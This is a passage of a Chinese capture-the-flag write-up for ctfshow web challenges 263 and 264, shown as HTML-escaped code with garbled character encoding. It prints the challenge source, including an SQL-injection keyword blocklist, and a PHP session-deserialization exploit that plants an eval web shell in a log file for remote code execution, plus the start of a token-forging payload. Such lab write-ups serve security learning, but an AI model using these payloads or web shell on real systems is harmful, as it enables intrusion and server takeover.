class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1,maximum-scale=1, minimum-scale=1&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;</span><br><span class="line">&lt;title&gt;ctfshowç™»é™†&lt;/title&gt;</span><br><span class="line">&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;pc-kk-form&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;CTFshow ç™»é™†&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;&quot; onsubmit=&quot;return false;&quot;&gt;</span><br><span class="line">&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class="line">&lt;input id=&quot;u&quot; type=&quot;text&quot; placeholder=&quot;ç”¨æˆ·å&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class="line">&lt;input id=&quot;pass&quot; type=&quot;password&quot; placeholder=&quot;å¯†ç &quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;pc-kk-form-btn&quot;&gt;</span><br><span class="line">&lt;button onclick=&quot;check();&quot;&gt;ç™»é™†&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">function check()&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:&#x27;check.php&#x27;,</span><br><span class="line">type: &#x27;GET&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">&#x27;u&#x27;:$(&#x27;#u&#x27;).val(),</span><br><span class="line">&#x27;pass&#x27;:$(&#x27;#pass&#x27;).val()</span><br><span class="line">&#125;,</span><br><span class="line">success:function(data)&#123;</span><br><span class="line">alert(JSON.parse(data).msg);</span><br><span class="line">&#125;,</span><br><span class="line">error:function(data)&#123;</span><br><span class="line">alert(JSON.parse(data).msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹index.php é‡Œä¸»è¦çš„ php é€»è¾‘ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹check.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>= <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">[<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">],[</span><br><span class="line"><span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line"><span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line"><span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] //å¯†ç å¿…é¡»ä¸º<span class="number">128</span>ä½å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šç¬¦å·ï¼Œé˜²æ­¢çˆ†ç ´</span><br><span class="line">]</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line"><span class="comment">//ç™»é™†æˆåŠŸå–æ¶ˆæ¬¡æ•°ç´¯è®¡</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;æ¬¢è¿æ‚¨&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//ç™»é™†å¤±è´¥ç´¯è®¡æ¬¡æ•°åŠ 1</span></span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;ç™»é™†å¤±è´¥&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹inc/inc.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">use</span> \<span class="title">CTFSHOW</span>\<span class="title">CTFSHOW</span>; </span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;CTFSHOW.php&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CTFSHOW</span>([</span><br><span class="line">    <span class="string">&#x27;database_type&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_name&#x27;</span> =&gt; <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;port&#x27;</span> =&gt; <span class="number">3306</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;option&#x27;</span> =&gt; [</span><br><span class="line">        PDO::<span class="variable constant_">ATTR_CASE</span> =&gt; PDO::<span class="variable constant_">CASE_NATURAL</span></span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sqlæ³¨å…¥æ£€æŸ¥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;ä½¿ç”¨&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;ç™»é™†&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;æˆåŠŸ&quot;</span>:<span class="string">&quot;å¤±è´¥&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*ç”Ÿæˆå”¯ä¸€æ ‡å¿—</span></span><br><span class="line"><span class="comment">*æ ‡å‡†çš„UUIDæ ¼å¼ä¸ºï¼šxxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">uuid</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$chars</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));  </span><br><span class="line">    <span class="variable">$uuid</span> = <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">0</span>, <span class="number">8</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">8</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">12</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">16</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">20</span>, <span class="number">12</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$uuid</span> ;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>â€‹æœ€åä¸€ä¸ªæ–‡ä»¶æ²¡å•¥ç”¨ï¼Œåˆé•¿ï¼Œå°±ä¸æ”¾äº†ã€‚</p><p>â€‹å…ˆçœ‹ inc/inc.phpï¼Œé‡Œé¢å­˜åœ¨ <code>ini_set('session.serialize_handler', 'php');</code> ï¼Œæ ¹æ® user ç±»ï¼Œå‘ç°å¯ä»¥å†™å…¥æ–‡ä»¶ï¼Œå‘ç°åœ¨é­”æœ¯æ–¹æ³•__destruct ä¸­ä¼šæŠŠ password å†™å…¥ log-username æ–‡ä»¶ä¸­ï¼Œè€Œè¿™é‡Œçš„ username å’Œ password å¯æ§ï¼Œåœ¨ index.php ä¸­ä¼šæ£€æŸ¥æ˜¯å¦è®¾ç½®äº† sessionï¼Œå¹¶ä¸”ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;ä½¿ç”¨&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;ç™»é™†&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;æˆåŠŸ&quot;</span>:<span class="string">&quot;å¤±è´¥&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>â€‹å› ä¸º session.save_handler=&quot;&quot; äº user.ini é»˜è®¤è®¾ç½®ä¸ç¬¦ï¼Œä¼šååºåˆ—åŒ– session ä¸­ | åçš„æ•°æ®æ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€  payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">#palyoad:fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNDoiPD9waHAgZXZhbCgkX1BPU1RbYV0pOz8%2BIjt9</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè®¿é—® index.phpï¼Œå°† cookie çš„ limit å‚æ•°æ”¹ä¸ºç”Ÿæˆçš„ base64 ç¼–ç å­—ç¬¦ä¸²ï¼Œç„¶åè®¿é—® check.phpï¼Œæœ€åè®¿é—® log-1.php å³å¯è¿›è¡Œ rceã€‚</p><h1 id="web264"><a class="markdownIt-Anchor" href="#web264">#</a> web264ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>â€‹å’Œ 262 ä¸€æ ·ï¼Œè®¿é—® message.phpï¼Œç„¶åä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œä¼¼ä¹ä¸èƒ½ä¿®æ”¹ cookie äº†ï¼Œæ²¡åŠæ³•äº†ï¼Œç›´æ¥æ‰“å§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span 